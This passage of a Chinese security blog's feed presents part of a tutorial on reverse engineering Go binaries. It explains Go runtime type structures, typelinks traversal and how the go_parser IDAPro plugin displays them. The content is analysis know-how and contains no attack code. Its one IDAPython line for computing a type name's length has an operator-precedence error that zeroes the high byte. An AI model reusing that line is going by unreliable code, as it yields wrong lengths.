&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    inter *interfacetype&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    _type *_type&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    hash  &lt;span class=&quot;keyword&quot;&gt;uint32&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;// copy of _type.hash. Used for type switches.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    _     [&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;]&lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    fun   [&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]&lt;span class=&quot;keyword&quot;&gt;uintptr&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;// variable sized. fun[0]==0 means _type does not implement inter.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="security" scheme="http://jiayu0x.com/categories/security/"/>
    
    
      <category term="security" scheme="http://jiayu0x.com/tags/security/"/>
    
      <category term="malwr" scheme="http://jiayu0x.com/tags/malwr/"/>
    
      <category term="re" scheme="http://jiayu0x.com/tags/re/"/>
    
      <category term="golang" scheme="http://jiayu0x.com/tags/golang/"/>
    
  </entry>
  
  <entry>
    <title>Go二进制文件逆向分析从基础到进阶(3)——数据类型</title>
    <link href="http://jiayu0x.com/2020/09/02/go-binary-reverse-engineering-types/"/>
    <id>http://jiayu0x.com/2020/09/02/go-binary-reverse-engineering-types/</id>
    <published>2020-09-01T16:00:00.000Z</published>
    <updated>2020-09-25T09:57:19.615Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>本文首发于安全客: <a href="https://www.anquanke.com/post/id/215820" target="_blank" rel="external">https://www.anquanke.com/post/id/215820</a></p>
<p>书接前文，本文详细介绍 Go 二进制文件中的数据类型信息，如何定位并解析所有数据类型的定义。</p>
</blockquote>
<p><strong>传送门</strong>：</p>
<ol>
<li><a href="https://www.anquanke.com/post/id/214940" target="_blank" rel="external">Go二进制文件逆向分析从基础到进阶(1)——综述</a></li>
<li><a href="https://www.anquanke.com/post/id/215419" target="_blank" rel="external">Go二进制文件逆向分析从基础到进阶(2)——MetaInfo、函数符号和源码文件路径列表</a></li>
</ol>
<h2 id="8-types"><a href="#8-types" class="headerlink" title="8. types"></a>8. types</h2><h3 id="8-1-简介"><a href="#8-1-简介" class="headerlink" title="8.1 简介"></a>8.1 简介</h3><p>重温一下本系列第一篇《<a href="https://www.anquanke.com/post/id/214940" target="_blank" rel="external">Go二进制文件逆向分析从基础到进阶——综述</a>》文末介绍的 Go 语言中的数据类型。Go 在构建二进制文时把项目中所有数据类型信息也打包到二进制文件中，这些数据类型信息主要为 Go 语言中的 Stack Trace、Type Reflection 和类型转换服务。Go 语言内置的标准数据类型如下：</p>
<p><img src="https://p3.ssl.qhimg.com/t010f01af0e76e97c60.png" alt=""></p>
<a id="more"></a>
<p>而这些类型的底层实现，其实都基于一个底层的结构定义扩展组合而来：</p>
<p><img src="https://p3.ssl.qhimg.com/t01ec2c57eccba40a41.png" alt=""></p>
<p>如果只是一个没有绑定任何 Method 的 Basic Type ，那么用 <strong>rtype</strong> 的结构就可以简单表示。如果一个数据类型绑定了 Methods(这种数据类型也叫 <strong>Uncommon Type</strong>)，或者属于复杂的组合类型(Composite Type)，那么就需要用扩展组合的方式来表示了。复杂类型的扩展组合方式可以简单描述为（虚线表示可选）：</p>
<p><img src="/imgs/go_re/type_ext.png" style="zoom:50%;"></p>
<p>这里以一个典型的 Struct 类型的数据结构为例，源码级表示为：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// structType represents a struct type.</span></div><div class="line"><span class="keyword">type</span> structType <span class="keyword">struct</span> &#123;</div><div class="line">    rtype</div><div class="line">    pkgPath name</div><div class="line">    fields []structField <span class="comment">// fields address, sorted by offset</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> uncommonType <span class="keyword">struct</span> &#123;</div><div class="line">    pkgPath nameOff <span class="comment">// import path; empty for built-in types like int, string</span></div><div class="line">    mcount <span class="keyword">uint16</span>   <span class="comment">// number of methods</span></div><div class="line">    xcount <span class="keyword">uint16</span>   <span class="comment">// number of exported methods</span></div><div class="line">    moff <span class="keyword">uint32</span>     <span class="comment">// offset from this uncommontype to [mcount]method</span></div><div class="line">    _ <span class="keyword">uint32</span>        <span class="comment">// unused</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> structField <span class="keyword">struct</span> &#123;</div><div class="line">    name name           <span class="comment">// name is always non-empty</span></div><div class="line">    typ *rtype          <span class="comment">// type of field</span></div><div class="line">    offsetEmbed <span class="keyword">uintptr</span> <span class="comment">// byte offset of field&lt;&lt;1 | isEmbedded</span></div><div class="line">&#125;</div><div class="line"><span class="comment">// Method on non-interface type</span></div><div class="line"><span class="keyword">type</span> method <span class="keyword">struct</span> &#123;</div><div class="line">    name nameOff <span class="comment">// name of method</span></div><div class="line">    mtyp typeOff <span class="comment">// method type (without receiver)</span></div><div class="line">    ifn textOff  <span class="comment">// fn used in interface call (one-word receiver)</span></div><div class="line">    tfn textOff  <span class="comment">// fn used for normal method call</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在 Go 二进制文件中，用 IDAPro 查看实际的数据排列顺序，也如上面源码顺序一样由“上”到“下”（地址由低到高）。以 <strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong> 解析的某样本中一个实际的 Struct 数据为例，可以仔细对比一下源码的定义：</p>
<p><img src="/imgs/go_re/struct_in_ida.png" alt=""></p>
<h3 id="8-2-types-遍历思路"><a href="#8-2-types-遍历思路" class="headerlink" title="8.2 types 遍历思路"></a>8.2 types 遍历思路</h3><h4 id="8-2-1-runtime-newobject-的交叉引用"><a href="#8-2-1-runtime-newobject-的交叉引用" class="headerlink" title="8.2.1 runtime.newobject 的交叉引用"></a>8.2.1 runtime.newobject 的交叉引用</h4><p>一个 Go 二进制文件中，被静态链接打包进去几千个函数，连带着打包进去的变量、常量加起来也数以千计，对应于数以千计的 Type 定义。上面介绍了其中一个典型的 Struct 类型数据的定义，一个问题很自然地就抛出来了：如何在 Go 二进制文件中定位到这所有的数据类型定义，并解析他们 Type 信息？</p>
<p>如果对 Go 语言稍有了解的话，会知道 Go 底层在定义一个变量(为某类型的变量分配内存空间)时，都会调用一个函数 <code>runtime.newobject()</code> 。该函数的<a href="https://golang.org/src/runtime/malloc.go" target="_blank" rel="external">源码实现</a>如下(其中的 <code>_type</code> 其实就是上面所说的 <strong>rtype</strong>， 参考： <a href="https://golang.org/src/runtime/type.go" target="_blank" rel="external">src/runtime/type.go</a>：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// implementation of new builtin</span></div><div class="line"><span class="comment">// compiler (both frontend and SSA backend) knows the signature</span></div><div class="line"><span class="comment">// of this function</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">newobject</span><span class="params">(typ *_type)</span> <span class="title">unsafe</span>.<span class="title">Pointer</span></span> &#123;</div><div class="line">	<span class="keyword">return</span> mallocgc(typ.size, typ, <span class="literal">true</span>)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Allocate an object of size bytes.</span></div><div class="line"><span class="comment">// Small objects are allocated from the per-P cache's free lists.</span></div><div class="line"><span class="comment">// Large objects (&gt; 32 kB) are allocated straight from the heap.</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">mallocgc</span><span class="params">(size <span class="keyword">uintptr</span>, typ *_type, needzero <span class="keyword">bool</span>)</span> <span class="title">unsafe</span>.<span class="title">Pointer</span></span></div></pre></td></tr></table></figure>
<p>在 IDAPro 中看到的调用 <code>runtime.newobject()</code> 函数的形式通常如下：</p>
<p><img src="/imgs/go_re/runtime_newobj_in_ida.png" style="zoom:70%;"></p>
<p>如此一来，就可以在 IDAPro 中遍历 <code>runtime.newobject()</code> 函数的交叉引用，然后在汇编指令中提取参数，就获取到了目标数据类型定义的地址。按照这个思路，就能一一定位到这些数据类型：</p>
<p><img src="/imgs/go_re/xrefsto_runtime_newobj.png" alt=""></p>
<p>然而，这种方式存在一些问题。可以看到上面 <code>runtime.newobject()</code> 函数的交叉引用个数为 <strong>2568</strong> ，而在前文 《<strong><a href="https://www.anquanke.com/post/id/215419" target="_blank" rel="external">Go二进制文件逆向分析从基础到进阶——MetaInfo、函数符号和源码文件路径列表</a></strong>》 介绍的 <strong>firstmoduledata</strong> 结构中的 <strong>typelinks</strong> 的个数为 <strong>0xA91(2705)</strong> 。说明 <code>runtime.newobject()</code> 函数的交叉引用覆盖不全。漏了哪些呢？下图所示的用法是情况之一，即把某个类型指针当作参数传入一个函数：</p>
<p><img src="/imgs/go_re/typeptr_as_func_arg.png" style="zoom:80%;"></p>
<h4 id="8-2-2-遍历-firstmoduledata-typelinks"><a href="#8-2-2-遍历-firstmoduledata-typelinks" class="headerlink" title="8.2.2 遍历 firstmoduledata.typelinks"></a>8.2.2 遍历 firstmoduledata.typelinks</h4><p>所以，通过遍历 <code>runtime.newobject()</code> 函数交叉引用的方式来遍历所有数据类型定义，不够完美。最好的方式，上面已经暗示了，是遍历 <strong>firstmoduledata</strong> 结构中的 <strong>typelinks</strong>。 <strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong> 解析好的 <strong>typelinks</strong> 如下：</p>
<p><img src="/imgs/go_re/typelinks_in_ida.png" alt=""></p>
<p><strong>typelinks</strong> 中的数据，以 4-Bytes(uint32) 为单位，每个值代表一个相对于 <code>firstmoduledata.types</code> 起始地址的 <strong>Offset</strong>，即 <code>firstmoduledata.types</code> 加上这个 <strong>Offset</strong> 值，就是相应的数据类型定义信息的<strong>地址</strong>。 <strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong> 会把每个计算好的地址值，以 Comment 的形式打到每个 Offset 后面，双击 Comment 中的地址值，即可跳转到对应的数据类型定义的位置。</p>
<h3 id="8-3-rtype-解析"><a href="#8-3-rtype-解析" class="headerlink" title="8.3 rtype 解析"></a>8.3 rtype 解析</h3><p>上文已经阐述了 Go 二进制文件中所有 Type 信息如何组织、存放的，以及通过什么样的方式可以找到这些数据类型定义信息。接下来的问题就是，如何解析每一个找到的数据类型定义，从中提取有助于逆向分析的信息，并以友好的方式在 IDAPro 中展示出来。</p>
<h4 id="8-3-1-rtype"><a href="#8-3-1-rtype" class="headerlink" title="8.3.1 rtype"></a>8.3.1 rtype</h4><p>前面提过多次 <strong>rtype</strong>，可以表示最简单的数据类型(Common Basic Types)。<strong>rtype</strong> 在源码中的定义如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">// Refer: https://golang.org/src/reflect/type.go</div><div class="line"></div><div class="line">type rtype struct &#123;</div><div class="line">    size       uintptr</div><div class="line">    ptrdata    uintptr  // number of bytes in the type that can contain pointers</div><div class="line">    hash       uint32   // hash of type; avoids computation in hash tables</div><div class="line">    tflag      tflag    // extra type information flags</div><div class="line">    align      uint8    // alignment of variable with this type</div><div class="line">    fieldAlign uint8    // alignment of struct field with this type</div><div class="line">    kind       uint8    // enumeration for C</div><div class="line">    alg        *typeAlg // algorithm table</div><div class="line">    gcdata     *byte    // garbage collection data</div><div class="line">    str        nameOff  // string form</div><div class="line">    ptrToThis  typeOff  // type for pointer to this type, may be zero</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>还是以前面贴过的 <code>*x509.SystemRootsError</code> 这个类型为例：</p>
<p><img src="/imgs/go_re/rtype_in_ida.png" alt=""></p>
<p><strong>rtype</strong> 中对逆向分析最有用的字段有以下几个：</p>
<ul>
<li><strong>tflag</strong>：1 Byte(uint8)，当前类型的 flag；</li>
<li><strong>kind</strong>：1 Byte(uint8)，当前类型的底层类型代码；</li>
<li><strong>str</strong>：4 Bytes(uint32)，当前类型 name string 的偏移(相对于 <strong>firstmoduledata.types</strong>)</li>
<li><strong>ptrtothis</strong>：4 Bytes(uint32)，如果有另外的<strong>指针类型</strong>指向本类型，那么 <strong>ptrtothis</strong> 就是那个指针类型相对于 <strong>firstmoduledata.types</strong> 的偏移量；</li>
</ul>
<p><strong>tflag</strong> 可能的值有 3 个：</p>
<ul>
<li><strong>star prefix</strong>：即 <strong>nams string</strong> 以星号 <code>*</code> 开头，如果 <strong>tflag</strong> 值与 <strong>1</strong> 按位与的结果不为 0，则该类型的 star prefix flag 为 True；</li>
<li><strong>named</strong>：即该类型是被显示命名的，或者是为标准类型拟了一个别名，如果 <strong>tflag</strong> 值与 <strong>2</strong> 按位与的结果不为零，则 named flag 为 True；</li>
<li><strong>Uncommon</strong>：该类型有绑定的 Methods，如果 <strong>tflag</strong> 的值与 <strong>4</strong> 按位与的结果不为零，则该类型为 Uncommon Type。</li>
</ul>
<p><strong>kind</strong> 是个 uint 类型的枚举变量，在 <a href="https://golang.org/src/reflect/type.go" target="_blank" rel="external">src/reflect/type.go</a> 中的定义的如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// A Kind represents the specific kind of type that a Type represents.</span></div><div class="line"><span class="comment">// The zero Kind is not a valid kind.</span></div><div class="line"><span class="keyword">type</span> Kind <span class="keyword">uint</span></div><div class="line"></div><div class="line"><span class="keyword">const</span> (</div><div class="line">	Invalid Kind = <span class="literal">iota</span></div><div class="line">	Bool</div><div class="line">	Int</div><div class="line">	Int8</div><div class="line">	Int16</div><div class="line">	Int32</div><div class="line">	Int64</div><div class="line">	Uint</div><div class="line">	Uint8</div><div class="line">	Uint16</div><div class="line">	Uint32</div><div class="line">	Uint64</div><div class="line">	Uintptr</div><div class="line">	Float32</div><div class="line">	Float64</div><div class="line">	Complex64</div><div class="line">	Complex128</div><div class="line">	Array</div><div class="line">	Chan</div><div class="line">	Func</div><div class="line">	Interface</div><div class="line">	Map</div><div class="line">	Ptr</div><div class="line">	Slice</div><div class="line">	String</div><div class="line">	Struct</div><div class="line">	UnsafePointer</div><div class="line">)</div></pre></td></tr></table></figure>
<p>但是 Go 二进制文件中看到的 <strong>rtype</strong> 里 <strong>kind</strong> 字段的值，并不是跟上面的枚举值对应的，而是与一个 Kind 掩码进行按位与计算之后，才能与上面的枚举值对应。Go 语言中的 Kind 掩码定义如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">KIND_MASK           = (<span class="number">1</span> &lt;&lt; <span class="number">5</span>) - <span class="number">1</span></div></pre></td></tr></table></figure>
<p><strong>name</strong> 是一个 uint32 类型的值，代表一个相对于 <strong>firstmoduledata.types</strong> 的<strong>偏移量</strong>，这个偏移量加上 <strong>firstmoduledata.types</strong> 得出一个<strong>地址值</strong>，这个地址就是当前 <strong>rtype</strong> 的 <strong>name</strong> 信息所在的位置。不过这个 <strong>name</strong> 既不是以 <code>0x00</code> 结尾的 C-String，也不是以 Length 指定长度的一串字符，而是另外一个专门的 <strong>type name</strong> 结构体。</p>
<h4 id="8-3-2-type-name"><a href="#8-3-2-type-name" class="headerlink" title="8.3.2 type name"></a>8.3.2 type name</h4><p>先看一下 <strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong> 解析好的一个基础的 type name：</p>
<p><img src="/imgs/go_re/simple_typename_in_ida.png" alt=""></p>
<p>一个 type name 基础数据，包含以下字段：</p>
<ul>
<li><strong>flag</strong>: 1 Byte(uint8)，可以标记本 type name 是否<strong>可导出</strong>(首字母大写)，以及是否附带 <strong>tag data</strong> 或 <strong>package path</strong> ；</li>
<li><strong>length</strong>: 2 Bytes(uint16)，2 个字节通过计算得出本 <strong>type name</strong> string 的长度</li>
<li><strong>name string</strong>：<strong>length</strong> 个 Bytes，就是最终的 type name string。</li>
</ul>
<p>先介绍一下 2 Bytes 的 <strong>type name</strong> 的 Length 如何计算。<strong>type name</strong> 的源码定义中的一段注释如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">The first byte of type name is a bit field containing:</div><div class="line">    </div><div class="line">	1&lt;&lt;0 the name is exported</div><div class="line">	1&lt;&lt;1 tag data follows the name</div><div class="line">	1&lt;&lt;2 pkgPath nameOff follows the name and tag</div><div class="line">    </div><div class="line">The next two bytes are the type name string length:</div><div class="line">    </div><div class="line">    len := uint16(type_name_data[1])&lt;&lt;8 | uint16(type_name_data[2])</div><div class="line">    </div><div class="line">Bytes [3:3+l] are the string data.</div></pre></td></tr></table></figure>
<p>Length 计算方式也一目了然，如果用 IDAPython 来表示，就是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">len = ((idc.Byte(type_name_addr + <span class="number">1</span>) &amp; <span class="number">0xFF</span> &lt;&lt; <span class="number">8</span>) | (idc.Byte(type_name_addr + <span class="number">2</span>) &amp; <span class="number">0xFF</span>)) &amp; <span class="number">0xFFFF</span></div></pre></td></tr></table></figure>
<p><strong>name flag</strong> 的 3 种情况，与 <strong>rtype tflag</strong> 的 3 种情况类似，计算方式也相同，都是分别与 (1, 2, 4) 进行<strong>按位与</strong>运算，依据结果来看本 <strong>type name</strong> 是否可导出，以及是否附带 <strong>tag data</strong> 或 <strong>package path</strong>。在 Go 语言的规范中，<strong>可导出</strong> 就意味着 <strong>首字母大写</strong>。</p>
<p><strong>tag</strong> 在 Go 中也很常见，相当于给相应的 <strong>type name</strong> 又起了一个别名。最常见的用法是用 Struct 定义 Json 结构时，给 Struct 中的字段打上一个 Json 的 Tag。如果 <strong>type name</strong> 附带了 <strong>tag data</strong>，那么紧接着 <strong>type name</strong> 的 String 数据后 2 Bytes，就是 <strong>tag string</strong> 的长度，该长度值计算方式同于 <strong>type name</strong> length。2 Bytes 之后，就是指定长度的 <strong>tag string</strong> 数据。如下所示：</p>
<p><img src="/imgs/go_re/typename_with_tag.png" alt=""></p>
<p><strong>package path</strong> 则是在 <strong>type name</strong> 的基础数据和 <strong>tag data</strong> 之后，是一个 4 Bytes(uint32) 类型的 Offset 值，这个 Offset 是相对于 <strong>firstmoduledata.types</strong> 来说的，相加之后得出一个 <strong>type name</strong> 的 <strong>地址</strong>。这个地址，指向的是另外一个 <strong>type name</strong> 结构，这个结构就存放了 <strong>pacakge path</strong> 的信息。这个 <strong>package path</strong> 结构的解析，也就跟 <strong>type name</strong> 一样了。下图是一个标准库 <strong>sync</strong> 中的 type name，一目了然：</p>
<p><img src="/imgs/go_re/typename_with_pkgpath.png" alt=""> </p>
<h3 id="8-4-composite-type-解析"><a href="#8-4-composite-type-解析" class="headerlink" title="8.4 composite type 解析"></a>8.4 composite type 解析</h3><p>Go 中的 Common Basic Types 都可以用上面的 <strong>rtype</strong> 来表示，如果 <strong>rtype.kind</strong> 对应于 Composite Types 其中一个，那么完整的类型定义就需要在 <strong>rtype</strong> 的基础上加上各自独有的字段或者属性才能表示了。本小节就盘点一下这些 Composite Types 的结构，以及解析思路。</p>
<h4 id="8-4-1-Ptr-Type"><a href="#8-4-1-Ptr-Type" class="headerlink" title="8.4.1 Ptr Type"></a>8.4.1 Ptr Type</h4><p>Ptr Type 即指针类型，它指向某一个具体的数据类型。源码定义如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> ptrType <span class="keyword">struct</span> &#123;</div><div class="line">    rtype</div><div class="line">    elem *rtype <span class="comment">// pointer element (pointed at) type</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>即在 <strong>rtype</strong> 后面又附带了一个指向 <strong>rtype</strong> 的指针(是地址，不是偏移)，对这个被指向的 <strong>rtype</strong> 的解析，参考上文即可。 <strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong> 解析好的一个 Ptr Type 结构效果如图所示：</p>
<p><img src="/imgs/go_re/ptrtype.png" alt=""></p>
<h4 id="8-4-2-Struct-Type"><a href="#8-4-2-Struct-Type" class="headerlink" title="8.4.2 Struct Type"></a>8.4.2 Struct Type</h4><p>Struct Type 即 Go 语言中的结构体。不同于 C 中的 Struct，Go 中的 Struct 中的字段有的可以导出，有的只能私用，还可以匿名存在，最重要的时可以绑定方法，其实更像是面向对象概念中的 <strong>类(Class)</strong>。Struct Type 源码定义如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> structType <span class="keyword">struct</span> &#123;</div><div class="line">    rtype</div><div class="line">    pkgPath name          <span class="comment">// !! pointer</span></div><div class="line">    fields  []structField <span class="comment">// sorted by offset</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可以看到 Struct Type 是在 <strong>rtype</strong> 数据后面加了一个 <strong>package path</strong> 和一组 <strong>structField</strong>。<strong>pkgPath</strong> 其实是相对于 <strong>firstmoduledata.types</strong> 的一个偏移，指向一个 <strong>type name</strong> 结构，解析方式参考上文。<strong>fields</strong> ，顾名思义，就是 Struct 中的字段定义信息。</p>
<p><strong>structField</strong> 在源码中的定义如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> structField <span class="keyword">struct</span> &#123;</div><div class="line">    name        name    <span class="comment">// name is always non-empty</span></div><div class="line">    typ         *rtype  <span class="comment">// type of field</span></div><div class="line">    offsetEmbed <span class="keyword">uintptr</span> <span class="comment">// byte offset of field&lt;&lt;1 | isEmbedded</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>structField</strong> 前两个成员对逆向分析最有帮助：</p>
<ol>
<li>指向一个 <strong>type name</strong> 结构的地址，表示本 <strong>structField</strong> 的 <strong>field name</strong>；</li>
<li>指向一个 <strong>type</strong> 的地址，表示本 <strong>structField</strong> 的数据类型。</li>
</ol>
<p>综合起来，一个完整的 Struct 结构，经过  <strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong> 的解析，在 IDAPro 中展示如下：</p>
<p><img src="/imgs/go_re/structtype.png" alt=""></p>
<h4 id="8-4-3-Slice-Type"><a href="#8-4-3-Slice-Type" class="headerlink" title="8.4.3 Slice Type"></a>8.4.3 Slice Type</h4><p>Slice 即<strong>切片</strong>。Go 数组的长度不可改变，在特定场景中这样的集合就不太适用，所以 Go 就以 “动态数组” 的概念提供了一个类似数组，但可灵活伸缩的数据结构——切片。Slice 的源码定义如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> sliceType <span class="keyword">struct</span> &#123;</div><div class="line">    rtype</div><div class="line">    elem *rtype <span class="comment">// slice element type</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>结构类似 Ptr Type，在 <strong>rtype</strong> 数据后面加上一个指向 <strong>element type</strong> 的地址。<strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong> 解析好的一个典型的 Slice 类型如下：</p>
<p><img src="/imgs/go_re/slicetype.png" alt=""></p>
<h4 id="8-4-4-Array-Type"><a href="#8-4-4-Array-Type" class="headerlink" title="8.4.4 Array Type"></a>8.4.4 Array Type</h4><p>数组类型源码定义如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> arrayType <span class="keyword">struct</span> &#123;</div><div class="line">    rtype</div><div class="line">    elem  *rtype <span class="comment">// array element type</span></div><div class="line">    slice *rtype <span class="comment">// slice type</span></div><div class="line">    <span class="built_in">len</span>   <span class="keyword">uintptr</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Array Type 是在 <strong>rtype</strong> 数据后面附上 Array element type 的地址、对应的 Slice 类型的地址和本 Array Type 的长度。<strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong> 解析好的一个 Array Type 在 IDAPro 中展示如下：</p>
<p><img src="/imgs/go_re/array_type.png" alt=""></p>
<h4 id="8-4-5-Interface-Type"><a href="#8-4-5-Interface-Type" class="headerlink" title="8.4.5 Interface Type"></a>8.4.5 Interface Type</h4><p>Go 中的 Interface 类型，指的是定义一组行为/方法的数据类型。任何其他实现了这一组方法的类型，都可以说<strong>实现了这个接口</strong>。 Interface Type 的源码定义如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> interfaceType <span class="keyword">struct</span> &#123;</div><div class="line">    rtype</div><div class="line">    pkgPath name      <span class="comment">// import path</span></div><div class="line">    methods []imethod <span class="comment">// sorted by hash</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>即在 <strong>rtype</strong> 的数据后面加上了一个 <strong>pkgPath</strong> 和一组 <strong>imethod</strong>。<strong>pkgPath</strong> 是一个指向 <strong>type name</strong> 结构的地址。<strong>imethod</strong> 就是 Interface 中定义的、必须实现的方法，其源码定义如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> imethod <span class="keyword">struct</span> &#123;</div><div class="line">    name nameOff <span class="comment">// name of method</span></div><div class="line">    typ  typeOff <span class="comment">// .(*FuncType) underneath</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>两个成员都是相对于 <strong>firstmoduledata.types</strong> 的 <strong>偏移量</strong>，第一个成员 <strong>name</strong> 即当前 Method 的名字，计算得出的地址，指向一个 <strong>type name</strong> 结构；第二个 <strong>typ</strong> 即当前 Method 的类型，其实就是方法的声明信息，计算得出的地址，指向一个 <strong>func type</strong> 的结构。 <strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong> 解析好的一个完整的 Interface Type 如下：</p>
<p><img src="/imgs/go_re/interface_type.png" alt=""></p>
<h4 id="8-4-6-Func-Type"><a href="#8-4-6-Func-Type" class="headerlink" title="8.4.6 Func Type"></a>8.4.6 Func Type</h4><p>Func Type，顾名思义，就是函数或者方法的类型。源码定义如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> funcType <span class="keyword">struct</span> &#123;</div><div class="line">    rtype</div><div class="line">    inCount  <span class="keyword">uint16</span></div><div class="line">    outCount <span class="keyword">uint16</span> <span class="comment">// top bit is set if last input parameter is ...</span></div><div class="line"></div><div class="line">    padding  <span class="keyword">uint32</span> <span class="comment">// ! only on some architectures (e.g. x64)</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
